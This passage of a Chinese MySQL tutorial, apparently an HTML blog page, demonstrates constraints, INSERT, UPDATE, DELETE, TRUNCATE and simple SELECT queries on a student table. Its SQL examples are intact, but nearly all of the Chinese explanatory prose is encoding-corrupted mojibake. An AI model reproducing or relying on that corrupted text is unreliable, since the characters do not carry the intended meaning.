é»˜è®¤å€¼ï¼›</p><p>ç¤ºä¾‹ï¼šMySQLå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student03(<br>id int,<br>name varchar(20),<br>gender varchar(10) default &#x27;male&#x27;<br>)<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303173835546.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5-å”¯ä¸€æ€§çº¦æŸ"><a href="#5-å”¯ä¸€æ€§çº¦æŸ" class="headerlink" title="5.å”¯ä¸€æ€§çº¦æŸ"></a>5.å”¯ä¸€æ€§çº¦æŸ</h2><p>å”¯ä¸€æ€§çº¦æŸå³UNIQUEç”¨äºä¿è¯æ•°æ®è¡¨ä¸­å­—æ®µçš„å”¯ä¸€æ€§ï¼Œå³è¡¨ä¸­å­—æ®µçš„å€¼ä¸èƒ½é‡å¤å‡ºç°ï¼Œå…¶åŸºæœ¬çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p>â€‹    <code>å­—æ®µå æ•°æ®ç±»å‹ UNIQUE;</code></p><p>ç¤ºä¾‹ï¼šMySQLå‘½ä»¤ï¼š</p><p>â€‹    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student04(<br>  id int,<br>   name varchar(20) unique<br>   );<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303174216204.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="6-å¤–é”®çº¦æŸ"><a href="#6-å¤–é”®çº¦æŸ" class="headerlink" title="6.å¤–é”®çº¦æŸ"></a>6.å¤–é”®çº¦æŸ</h2><p>å¤–é”®çº¦æŸå³FOREIGN KEYå¸¸ç”¨äºå¤šå¼ è¡¨ä¹‹é—´çš„çº¦æŸã€‚åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><p>â€‹<br>â€‹    â€“ åœ¨åˆ›å»ºæ•°æ®è¡¨æ—¶è¯­æ³•å¦‚ä¸‹ï¼š<br>â€‹    CONSTRAINT å¤–é”®å FOREIGN KEY (ä»è¡¨å¤–é”®å­—æ®µ) REFERENCES ä¸»è¡¨ (ä¸»é”®å­—æ®µ)<br>â€‹    â€“ å°†åˆ›å»ºæ•°æ®è¡¨åˆ›å·åè¯­æ³•å¦‚ä¸‹ï¼š<br>â€‹    ALTER TABLE ä»è¡¨å ADD CONSTRAINT å¤–é”®å FOREIGN KEY (ä»è¡¨å¤–é”®å­—æ®µ) REFERENCES ä¸»è¡¨ (ä¸»é”®å­—æ®µ);</p><p>ç¤ºä¾‹ï¼šåˆ›å»ºä¸€ä¸ªå­¦ç”Ÿè¡¨ MySQLå‘½ä»¤ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student05(<br>id int primary key,<br>name varchar(20)<br>);<br><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šåˆ›å»ºä¸€ä¸ªç­çº§è¡¨ MySQLå‘½ä»¤ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table class(<br>classid int primary key,<br>studentid int<br>);<br><br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼šå­¦ç”Ÿè¡¨ä½œä¸ºä¸»è¡¨ï¼Œç­çº§è¡¨ä½œä¸ºå‰¯è¡¨è®¾ç½®å¤–é”®ï¼Œ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table class add constraint fk_class_studentid foreign key(studentid) references student05(id);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303180124470.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="6-1-æ•°æ®ä¸€è‡´æ€§æ¦‚å¿µ"><a href="#6-1-æ•°æ®ä¸€è‡´æ€§æ¦‚å¿µ" class="headerlink" title="6.1 æ•°æ®ä¸€è‡´æ€§æ¦‚å¿µ"></a>6.1 æ•°æ®ä¸€è‡´æ€§æ¦‚å¿µ</h3><p>å¤§å®¶çŸ¥é“ï¼šå»ºç«‹å¤–é”®æ˜¯ä¸ºäº†ä¿è¯æ•°æ®çš„å®Œæ•´å’Œç»Ÿä¸€æ€§ã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸»è¡¨ä¸­çš„æ•°æ®è¢«åˆ é™¤æˆ–ä¿®æ”¹ä»è¡¨ä¸­å¯¹åº”çš„æ•°æ®è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå¾ˆæ˜æ˜¾ï¼Œä»è¡¨ä¸­å¯¹åº”çš„æ•°æ®ä¹Ÿåº”è¯¥è¢«åˆ é™¤ï¼Œå¦åˆ™æ•°æ®åº“ä¸­ä¼šå­˜åœ¨å¾ˆå¤šæ— æ„ä¹‰çš„åƒåœ¾æ•°æ®ã€‚</p><h3 id="6-2-åˆ é™¤å¤–é”®"><a href="#6-2-åˆ é™¤å¤–é”®" class="headerlink" title="6.2 åˆ é™¤å¤–é”®"></a>6.2 åˆ é™¤å¤–é”®</h3><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><p>â€‹    <code>alter table ä»è¡¨å drop foreign key å¤–é”®åï¼›</code></p><p>ç¤ºä¾‹ï¼šåˆ é™¤å¤–é”® MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>alter table class drop foreign key fk_class_studentid;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303180554954.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤–é”®çš„é‚£ä¸ªå­—æ®µä¸åœ¨äº†è¯æ˜åˆ é™¤æˆåŠŸäº†</p><h3 id="6-3-å…³äºå¤–é”®çº¦æŸéœ€è¦æ³¨æ„çš„ç»†èŠ‚"><a href="#6-3-å…³äºå¤–é”®çº¦æŸéœ€è¦æ³¨æ„çš„ç»†èŠ‚" class="headerlink" title="6.3 å…³äºå¤–é”®çº¦æŸéœ€è¦æ³¨æ„çš„ç»†èŠ‚"></a>6.3 å…³äºå¤–é”®çº¦æŸéœ€è¦æ³¨æ„çš„ç»†èŠ‚</h3><p>1ã€ä»è¡¨é‡Œçš„å¤–é”®é€šå¸¸ä¸ºä¸»è¡¨çš„ä¸»é”®<br>2ã€ä»è¡¨é‡Œå¤–é”®çš„æ•°æ®ç±»å‹å¿…é¡»ä¸ä¸»è¡¨ä¸­ä¸»é”®çš„æ•°æ®ç±»å‹ä¸€è‡´<br>3ã€ä¸»è¡¨å‘ç”Ÿå˜åŒ–æ—¶åº”æ³¨æ„ä¸»è¡¨ä¸ä»è¡¨çš„æ•°æ®ä¸€è‡´æ€§é—®é¢˜</p><h1 id="å…­ã€æ•°æ®è¡¨æ’å…¥æ•°æ®"><a href="#å…­ã€æ•°æ®è¡¨æ’å…¥æ•°æ®" class="headerlink" title="å…­ã€æ•°æ®è¡¨æ’å…¥æ•°æ®"></a>å…­ã€æ•°æ®è¡¨æ’å…¥æ•°æ®</h1><p>åœ¨MySQLé€šè¿‡INSERTè¯­å¥å‘æ•°æ®è¡¨ä¸­æ’å…¥æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€å¼ å­¦ç”Ÿè¡¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table student(<br>id int,<br>name varchar(30),<br>age int,<br>gender varchar(30)<br>);<br><br></code></pre></td></tr></table></figure><h2 id="1-ä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®"><a href="#1-ä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®" class="headerlink" title="1. ä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®"></a>1. ä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®</h2><p>æ¯ä¸ªå­—æ®µä¸å…¶å€¼æ˜¯ä¸¥æ ¼ä¸€ä¸€å¯¹åº”çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯ä¸ªå€¼ã€å€¼çš„é¡ºåºã€å€¼çš„ç±»å‹å¿…é¡»ä¸å¯¹åº”çš„å­—æ®µç›¸åŒ¹é…ã€‚ä½†æ˜¯ï¼Œå„å­—æ®µä¹Ÿæ— é¡»ä¸å…¶åœ¨è¡¨ä¸­å®šä¹‰çš„é¡ºåºä¸€è‡´ï¼Œå®ƒä»¬åªè¦ä¸<br>VALUESä¸­å€¼çš„é¡ºåºä¸€è‡´å³å¯ã€‚<br>è¯­æ³•å¦‚ä¸‹ï¼š</p><p>â€‹    <code>INSERT INTO è¡¨åï¼ˆå­—æ®µå1,å­—æ®µå2,...) VALUES (å€¼ 1,å€¼ 2,...);</code></p><p>ç¤ºä¾‹ï¼šå‘å­¦ç”Ÿè¡¨ä¸­æ’å…¥ä¸€æ¡å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>insert into student (id,name,age,gender) values (1,&#39;bob&#39;,16,&#39;male&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://img-blog.csdnimg.cn/2021030318190944.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="2-ä¸ºè¡¨ä¸­æŒ‡å®šå­—æ®µæ’å…¥æ•°æ®"><a href="#2-ä¸ºè¡¨ä¸­æŒ‡å®šå­—æ®µæ’å…¥æ•°æ®" class="headerlink" title="2. ä¸ºè¡¨ä¸­æŒ‡å®šå­—æ®µæ’å…¥æ•°æ®"></a>2. ä¸ºè¡¨ä¸­æŒ‡å®šå­—æ®µæ’å…¥æ•°æ®</h2><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><p>â€‹    <code>INSERT INTO è¡¨åï¼ˆå­—æ®µå1,å­—æ®µå2,...) VALUES (å€¼ 1,å€¼ 2,...);</code></p><p>æ’å…¥æ•°æ®çš„æ–¹æ³•åŸºæœ¬å’Œä¸ºè¡¨ä¸­æ‰€æœ‰å­—æ®µæ’å…¥æ•°æ®ï¼Œä¸€æ ·ï¼Œåªæ˜¯éœ€è¦æ’å…¥çš„å­—æ®µç”±ä½ è‡ªå·±æŒ‡å®š</p><h2 id="3-åŒæ—¶æ’å…¥å¤šæ¡è®°å½•"><a href="#3-åŒæ—¶æ’å…¥å¤šæ¡è®°å½•" class="headerlink" title="3. åŒæ—¶æ’å…¥å¤šæ¡è®°å½•"></a>3. åŒæ—¶æ’å…¥å¤šæ¡è®°å½•</h2><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><p><strong>â€‹    INSERT INTO è¡¨å [(å­—æ®µå1,å­—æ®µå2,â€¦)]VALUES (å€¼ 1,å€¼ 2,â€¦),(å€¼ 1,å€¼ 2,â€¦),â€¦;</strong></p><p>åœ¨è¯¥æ–¹å¼ä¸­ï¼š(å­—æ®µå1,å­—æ®µå2,â€¦)æ˜¯å¯é€‰çš„ï¼Œå®ƒç”¨äºæŒ‡å®šæ’äººçš„å­—æ®µåï¼›(å€¼ 1,å€¼ 2,â€¦),(å€¼ 1,å€¼<br>2,â€¦)è¡¨ç¤ºè¦æ’äººçš„è®°å½•ï¼Œè¯¥è®°å½•å¯æœ‰å¤šæ¡å¹¶ä¸”æ¯æ¡è®°å½•ä¹‹é—´ç”¨é€—å·éš”å¼€ã€‚<br>ç¤ºä¾‹ï¼šå‘å­¦ç”Ÿè¡¨ä¸­æ’å…¥å¤šæ¡å­¦ç”Ÿä¿¡æ¯ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>insert into student (id,name,age,gender) values (2,&#39;lucy&#39;,17,&#39;female&#39;),(3,&#39;jack&#39;,19,&#39;male&#39;),(4,&#39;tom&#39;,18,&#39;male&#39;);</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303182837401.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="ä¸ƒã€æ›´æ–°æ•°æ®"><a href="#ä¸ƒã€æ›´æ–°æ•°æ®" class="headerlink" title="ä¸ƒã€æ›´æ–°æ•°æ®"></a>ä¸ƒã€æ›´æ–°æ•°æ®</h1><p>åœ¨MySQLé€šè¿‡UPDATEè¯­å¥æ›´æ–°æ•°æ®è¡¨ä¸­çš„æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å°†å°±ç”¨å…­ä¸­çš„studentå­¦ç”Ÿè¡¨</p><h2 id="1-UPDATEåŸºæœ¬è¯­æ³•"><a href="#1-UPDATEåŸºæœ¬è¯­æ³•" class="headerlink" title="1. UPDATEåŸºæœ¬è¯­æ³•"></a>1. UPDATEåŸºæœ¬è¯­æ³•</h2><p>â€‹    <strong>UPDATE è¡¨å SET å­—æ®µå1&#x3D;å€¼1[,å­—æ®µå2 &#x3D;å€¼2,â€¦] [WHERE æ¡ä»¶è¡¨è¾¾å¼];</strong></p><p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šå­—æ®µå1ã€å­—æ®µå2â€¦ç”¨äºæŒ‡å®šè¦æ›´æ–°çš„å­—æ®µåç§°ï¼›å€¼1ã€å€¼ 2â€¦ç”¨äºè¡¨ç¤ºå­—æ®µçš„æ–°æ•°æ®ï¼›WHERE æ¡ä»¶è¡¨è¾¾å¼<br>æ˜¯å¯é€‰çš„ï¼Œå®ƒç”¨äºæŒ‡å®šæ›´æ–°æ•°æ®éœ€è¦æ»¡è¶³çš„æ¡ä»¶</p><h2 id="2-UPDATEæ›´æ–°éƒ¨åˆ†æ•°æ®"><a href="#2-UPDATEæ›´æ–°éƒ¨åˆ†æ•°æ®" class="headerlink" title="2. UPDATEæ›´æ–°éƒ¨åˆ†æ•°æ®"></a>2. UPDATEæ›´æ–°éƒ¨åˆ†æ•°æ®</h2><p>ç¤ºä¾‹ï¼šå°†nameä¸ºtomçš„è®°å½•çš„ageè®¾ç½®ä¸º20å¹¶å°†å…¶genderè®¾ç½®ä¸ºfemale MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>update student set age=20,gender=&#39;female&#39; where name=&#39;tom&#39;;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030318372031.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-UPDATEæ›´æ–°å…¨éƒ¨æ•°æ®"><a href="#3-UPDATEæ›´æ–°å…¨éƒ¨æ•°æ®" class="headerlink" title="3. UPDATEæ›´æ–°å…¨éƒ¨æ•°æ®"></a>3. UPDATEæ›´æ–°å…¨éƒ¨æ•°æ®</h2><p>ç¤ºä¾‹ï¼šå°†æ‰€æœ‰è®°å½•çš„ageè®¾ç½®ä¸º18 MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>update student set age=18;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/2021030318401177.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="å…«ã€åˆ é™¤æ•°æ®"><a href="#å…«ã€åˆ é™¤æ•°æ®" class="headerlink" title="å…«ã€åˆ é™¤æ•°æ®"></a>å…«ã€åˆ é™¤æ•°æ®</h1><p>åœ¨MySQLé€šè¿‡DELETEè¯­å¥åˆ é™¤æ•°æ®è¡¨ä¸­çš„æ•°æ®ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€å¼ æ•°æ®è¡¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- åˆ›å»ºå­¦ç”Ÿè¡¨<br> create table student(<br> id int,<br> name varchar(30),<br> age int,<br> gender varchar(30)<br> );<br> -- æ’å…¥æ•°æ®<br> insert into student (id,name,age,gender) values (2,&#x27;lucy&#x27;,17,&#x27;female&#x27;),(3,&#x27;jack&#x27;,19,&#x27;male&#x27;),(4,&#x27;tom&#x27;,18,&#x27;male&#x27;),(5,&#x27;sal&#x27;,19,&#x27;female&#x27;),(6,&#x27;sun&#x27;,20,&#x27;male&#x27;)<br>,(7,&#x27;sad&#x27;,13,&#x27;female&#x27;),(8,&#x27;sam&#x27;,14,&#x27;male&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="1-DELETEåŸºæœ¬è¯­æ³•"><a href="#1-DELETEåŸºæœ¬è¯­æ³•" class="headerlink" title="1. DELETEåŸºæœ¬è¯­æ³•"></a>1. DELETEåŸºæœ¬è¯­æ³•</h2><p>åœ¨è¯¥è¯­æ³•ä¸­ï¼šè¡¨åç”¨äºæŒ‡å®šè¦æ‰§è¡Œåˆ é™¤æ“ä½œçš„è¡¨ï¼›[WHERE æ¡ä»¶è¡¨è¾¾å¼]ä¸ºå¯é€‰å‚æ•°ç”¨äºæŒ‡å®šåˆ é™¤çš„æ¡ä»¶ã€‚</p><p>â€‹    <strong>DELETE FROM è¡¨å [WHERE æ¡ä»¶è¡¨è¾¾å¼];</strong></p><h2 id="2-DELETEåˆ é™¤éƒ¨åˆ†æ•°æ®"><a href="#2-DELETEåˆ é™¤éƒ¨åˆ†æ•°æ®" class="headerlink" title="2. DELETEåˆ é™¤éƒ¨åˆ†æ•°æ®"></a>2. DELETEåˆ é™¤éƒ¨åˆ†æ•°æ®</h2><p>ç¤ºä¾‹ï¼šåˆ é™¤ageç­‰äº14çš„æ‰€æœ‰è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>delete from student where age=14;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303185050926.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-DELETEåˆ é™¤å…¨éƒ¨æ•°æ®"><a href="#3-DELETEåˆ é™¤å…¨éƒ¨æ•°æ®" class="headerlink" title="3. DELETEåˆ é™¤å…¨éƒ¨æ•°æ®"></a>3. DELETEåˆ é™¤å…¨éƒ¨æ•°æ®</h2><p>ç¤ºä¾‹ï¼šåˆ é™¤studentè¡¨ä¸­çš„æ‰€æœ‰è®°å½• MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>delete from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210303185424760.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-TRUNCATEå’ŒDETELEçš„åŒºåˆ«"><a href="#4-TRUNCATEå’ŒDETELEçš„åŒºåˆ«" class="headerlink" title="4. TRUNCATEå’ŒDETELEçš„åŒºåˆ«"></a>4. TRUNCATEå’ŒDETELEçš„åŒºåˆ«</h2><p>TRUNCATEå’ŒDETELEéƒ½èƒ½å®ç°åˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰æ•°æ®çš„åŠŸèƒ½ï¼Œä½†ä¸¤è€…ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼š  </p><ol><li>DELETEè¯­å¥åå¯è·ŸWHEREå­å¥ï¼Œå¯é€šè¿‡æŒ‡å®šWHEREå­å¥ä¸­çš„æ¡ä»¶è¡¨è¾¾å¼åªåˆ é™¤æ»¡è¶³æ¡ä»¶çš„éƒ¨åˆ†è®°å½•ï¼›ä½†æ˜¯ï¼ŒTRUNCATEè¯­å¥åªèƒ½ç”¨äºåˆ é™¤è¡¨ä¸­çš„æ‰€æœ‰è®°å½•ã€‚  </li><li>ä½¿ç”¨TRUNCATEè¯­å¥åˆ é™¤è¡¨ä¸­çš„æ•°æ®åï¼Œå†æ¬¡å‘è¡¨ä¸­æ·»åŠ è®°å½•æ—¶è‡ªåŠ¨å¢åŠ å­—æ®µçš„é»˜è®¤åˆå§‹å€¼é‡æ–°ç”±1å¼€å§‹ï¼›ä½¿ç”¨DELETEè¯­å¥åˆ é™¤è¡¨ä¸­æ‰€æœ‰è®°å½•åï¼Œå†æ¬¡å‘è¡¨ä¸­æ·»åŠ è®°å½•æ—¶è‡ªåŠ¨å¢åŠ å­—æ®µçš„å€¼ä¸ºåˆ é™¤æ—¶è¯¥å­—æ®µçš„æœ€å¤§å€¼åŠ 1</li><li>DELETEè¯­å¥æ˜¯DMLè¯­å¥ï¼ŒTRUNCATEè¯­å¥é€šå¸¸è¢«è®¤ä¸ºæ˜¯DDLè¯­å¥</li></ol><h1 id="ä¹ã€MySQLæ•°æ®è¡¨ç®€å•æŸ¥è¯¢"><a href="#ä¹ã€MySQLæ•°æ®è¡¨ç®€å•æŸ¥è¯¢" class="headerlink" title="ä¹ã€MySQLæ•°æ®è¡¨ç®€å•æŸ¥è¯¢"></a>ä¹ã€MySQLæ•°æ®è¡¨ç®€å•æŸ¥è¯¢</h1><h2 id="1-ç®€å•æŸ¥è¯¢æ¦‚è¿°"><a href="#1-ç®€å•æŸ¥è¯¢æ¦‚è¿°" class="headerlink" title="1.ç®€å•æŸ¥è¯¢æ¦‚è¿°"></a>1.ç®€å•æŸ¥è¯¢æ¦‚è¿°</h2><p>ç®€å•æŸ¥è¯¢å³ä¸å«whereçš„selectè¯­å¥ã€‚åœ¨æ­¤ï¼Œæˆ‘ä»¬è®²è§£ç®€å•æŸ¥è¯¢ä¸­æœ€å¸¸ç”¨çš„ä¸¤ç§æŸ¥è¯¢ï¼šæŸ¥è¯¢æ‰€æœ‰å­—æ®µå’ŒæŸ¥è¯¢æŒ‡å®šå­—æ®µã€‚<br>åœ¨æ­¤ï¼Œå…ˆå‡†å¤‡æµ‹è¯•æ•°æ®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mysql">-- åˆ›å»ºæ•°æ®åº“<br>DROP DATABASE IF EXISTS mydb;<br>CREATE DATABASE mydb;<br>USE mydb;<br><br>-- åˆ›å»ºstudentè¡¨<br>CREATE TABLE student (<br>    sid CHAR(6),<br>    sname VARCHAR(50),<br>    age INT,<br>    gender VARCHAR(50) DEFAULT &#x27;male&#x27;<br>);<br><br>-- å‘studentè¡¨æ’å…¥æ•°æ®<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1001&#x27;, &#x27;lili&#x27;, 14, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1002&#x27;, &#x27;wang&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1003&#x27;, &#x27;tywd&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1004&#x27;, &#x27;hfgs&#x27;, 17, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1005&#x27;, &#x27;qwer&#x27;, 18, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1006&#x27;, &#x27;zxsd&#x27;, 19, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1007&#x27;, &#x27;hjop&#x27;, 16, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1008&#x27;, &#x27;tyop&#x27;, 15, &#x27;female&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1009&#x27;, &#x27;nhmk&#x27;, 13, &#x27;male&#x27;);<br>INSERT INTO student (sid,sname,age,gender) VALUES (&#x27;S_1010&#x27;, &#x27;xdfv&#x27;, 17, &#x27;female&#x27;);<br><br></code></pre></td></tr></table></figure><h2 id="2-æŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼ˆæ–¹æ³•ä¸å”¯ä¸€åªæ˜¯ä¸¾ä¾‹ï¼‰"><a href="#2-æŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼ˆæ–¹æ³•ä¸å”¯ä¸€åªæ˜¯ä¸¾ä¾‹ï¼‰" class="headerlink" title="2.æŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼ˆæ–¹æ³•ä¸å”¯ä¸€åªæ˜¯ä¸¾ä¾‹ï¼‰"></a>2.æŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼ˆæ–¹æ³•ä¸å”¯ä¸€åªæ˜¯ä¸¾ä¾‹ï¼‰</h2><p>æŸ¥è¯¢æ‰€æœ‰å­—æ®µ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select * from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302183927761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="3-æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰"><a href="#3-æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰" class="headerlink" title="3.æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰"></a>3.æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰</h2><p>æŸ¥è¯¢æŒ‡å®šå­—æ®µï¼ˆsidã€snameï¼‰ MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select sid,sname from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302184506628.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="4-å¸¸æ•°çš„æŸ¥è¯¢"><a href="#4-å¸¸æ•°çš„æŸ¥è¯¢" class="headerlink" title="4.å¸¸æ•°çš„æŸ¥è¯¢"></a>4.å¸¸æ•°çš„æŸ¥è¯¢</h2><p>åœ¨SELECTä¸­é™¤äº†ä¹¦å†™åˆ—åï¼Œè¿˜å¯ä»¥ä¹¦å†™å¸¸æ•°ã€‚å¯ä»¥ç”¨äºæ ‡è®°<br>å¸¸æ•°çš„æŸ¥è¯¢æ—¥æœŸæ ‡è®° MySQLå‘½ä»¤ï¼š</p><p>â€‹    <code>select sid,sname,&#39;2021-03-02&#39; from student;</code></p><p>è¿è¡Œæ•ˆæœå±•ç¤ºï¼š<br><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210302185049215.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="5-ä»æŸ¥è¯¢ç»“æœä¸­è¿‡æ»¤é‡å¤æ•°æ®"><a href="#5-ä»æŸ¥è¯¢ç»“æœä¸­è¿‡æ»¤é‡å¤æ•°æ®" class="headerlink" title="5.ä»æŸ¥è¯¢ç»“æœä¸­è¿‡æ»¤é‡å¤æ•°æ®"></a>5.ä»æŸ¥è¯¢ç»“æœä¸­è¿‡æ»¤é‡å¤æ•°æ®</h2><p>åœ¨ä½¿ç”¨DISTINCT 